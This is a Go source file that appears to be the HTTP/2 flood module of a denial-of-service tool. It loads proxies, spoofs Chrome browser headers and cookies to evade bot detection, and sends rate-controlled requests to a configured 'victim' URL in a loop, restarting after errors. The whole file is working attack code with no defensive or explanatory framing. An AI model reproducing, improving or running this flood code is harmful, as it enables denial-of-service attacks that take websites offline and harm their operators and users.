package main

import (
	"fmt"
	"golang.org/x/net/http2"
	//"math/rand"
	"net/http"
	url2 "net/url"
	"sync"
	"time"
	//"strings"
)

var start = make(chan bool)

func HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
	restart:
	proxy := LoadedProxies[0]
	
	//fmt.Println(proxy)
	//fmt.Println(LoadedProxies)
	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	
	x, err := url.Parse(Sys.Attack.Url)
	if err != nil {
		fmt.Println("Error by Parsing Victim. Check Victim url.")
		return
	}
	Http2ProxyConfig := &http.Transport{
		Proxy: http.ProxyURL(url),
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfig)
	if err != nil {
		fmt.Println("Can't upgrade to http2")
		return
	}
	client := http.Client{
		Timeout: time.Duration(Sys.HTTP2Timeout)*time.Millisecond,
		Transport: Http2ProxyConfig,
	}
	req, err := http.NewRequest(Sys.Attack.AttackMethod, Sys.Attack.Url, nil)
	if err != nil {
		fmt.Println("Can't build Request")
		return
	}
	if Sys.Attack.Host != "" {
		req.Header.Set("Host", Sys.Attack.Host)
	}
	
   // s := strings.Split(proxy, ":")
   // ip := s[0]
    //fmt.Println(ip, port)	
	
	//req.Header.Set("X-Forwarded-For", ip)
	req.Header.Set(":method", "GET")
	req.Header.Set(":path", x.Host)
	req.Header.Set("host", x.Host)
	req.Header.Set("origin", "proxy")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US,en;q=0.9;")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Add("cookie", Sys.Attack.Cookie.(string))
	req.Header.Set("sec-ch-ua", "'Chromium';v='100', 'Google Chrome';v='100'")
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-dest", "document")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("sec-ch-ua-platform", "'Windows'")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("user-agent", Sys.Attack.Jokeragent.(string))

	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond*time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		_, err = client.Do(req)
		if err != nil {
			errs++
			if errs > 10 {
				errs=0
				goto restart
			}
		}
	}
}